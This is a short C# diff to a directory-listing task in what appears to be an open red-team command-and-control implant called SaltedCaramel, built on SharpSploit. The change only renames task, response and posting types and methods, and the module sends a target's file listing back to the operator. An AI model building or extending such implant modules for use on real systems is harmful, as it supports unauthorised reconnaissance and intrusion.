@@ -9,7 +9,7 @@ namespace SaltedCaramel.Tasks
 {
     class DirectoryList
     {
-        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
+        internal static void Execute(SCTask task, SCImplant implant)
         {
             string path = task.@params;
             SharpSploitResultList<Host.FileSystemEntryResult> list;
@@ -43,8 +43,8 @@ namespace SaltedCaramel.Tasks
                     }
                 }
 
-                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fileList), task.id);
-                implant.PostResponse(response);
+                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(fileList), task.id);
+                implant.SCPostResp(response);
                 implant.SendComplete(task.id);
             }
             catch (DirectoryNotFoundException)
